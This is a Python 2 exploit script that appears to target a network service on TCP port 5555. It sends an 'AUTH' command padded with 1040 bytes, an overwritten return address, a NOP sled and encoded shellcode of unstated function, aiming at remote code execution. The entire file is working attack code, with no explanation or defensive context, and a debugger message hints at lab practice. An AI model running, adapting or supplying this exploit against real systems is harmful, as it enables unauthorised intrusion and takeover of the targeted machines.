#!/usr/bin/python
import time, struct, sys
import socket as so

payload = (
"\xda\xd8\xbe\x52\xbb\x24\x82\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x70\x13\x03\x22\xa8\xc6\x77\x3e\x26\x84"
"\x78\xbe\xb7\xe9\xf1\x5b\x86\x29\x65\x28\xb9\x99\xed\x7c\x36"
"\x51\xa3\x94\xcd\x17\x6c\x9b\x66\x9d\x4a\x92\x77\x8e\xaf\xb5"
"\xfb\xcd\xe3\x15\xc5\x1d\xf6\x54\x02\x43\xfb\x04\xdb\x0f\xae"
"\xb8\x68\x45\x73\x33\x22\x4b\xf3\xa0\xf3\x6a\xd2\x77\x8f\x34"
"\xf4\x76\x5c\x4d\xbd\x60\x81\x68\x77\x1b\x71\x06\x86\xcd\x4b"
"\xe7\x25\x30\x64\x1a\x37\x75\x43\xc5\x42\x8f\xb7\x78\x55\x54"
"\xc5\xa6\xd0\x4e\x6d\x2c\x42\xaa\x8f\xe1\x15\x39\x83\x4e\x51"
"\x65\x80\x51\xb6\x1e\xbc\xda\x39\xf0\x34\x98\x1d\xd4\x1d\x7a"
"\x3f\x4d\xf8\x2d\x40\x8d\xa3\x92\xe4\xc6\x4e\xc6\x94\x85\x06"
"\x2b\x95\x35\xd7\x23\xae\x46\xe5\xec\x04\xc0\x45\x64\x83\x17"
"\xa9\x5f\x73\x87\x54\x60\x84\x8e\x92\x34\xd4\xb8\x33\x35\xbf"
"\x38\xbb\xe0\x10\x68\x13\x5b\xd1\xd8\xd3\x0b\xb9\x32\xdc\x74"
"\xd9\x3d\x36\x1d\x70\xc4\xd1\x28\x8e\xc6\x93\x45\x92\xc6\xd2"
"\x2e\x1b\x20\xbe\x40\x4a\xfb\x57\xf8\xd7\x77\xc9\x05\xc2\xf2"
"\xc9\x8e\xe1\x03\x87\x66\x8f\x17\x70\x87\xda\x45\xd7\x98\xf0"
"\xe1\xbb\x0b\x9f\xf1\xb2\x37\x08\xa6\x93\x86\x41\x22\x0e\xb0"
"\xfb\x50\xd3\x24\xc3\xd0\x08\x95\xca\xd9\xdd\xa1\xe8\xc9\x1b"
"\x29\xb5\xbd\xf3\x7c\x63\x6b\xb2\xd6\xc5\xc5\x6c\x84\x8f\x81"
"\xe9\xe6\x0f\xd7\xf5\x22\xe6\x37\x47\x9b\xbf\x48\x68\x4b\x48"
"\x31\x94\xeb\xb7\xe8\x1c\x1b\xf2\xb0\x35\xb4\x5b\x21\x04\xd9"
"\x5b\x9c\x4b\xe4\xdf\x14\x34\x13\xff\x5d\x31\x5f\x47\x8e\x4b"
"\xf0\x22\xb0\xf8\xf1\x66")

buffer = "\x43"

nopt = "\x90"

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"* (1040) + "\x71\xe8\x78\x77" + nopt*16 + payload + "HELLOFRIENDYOUGOTPWND"
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()


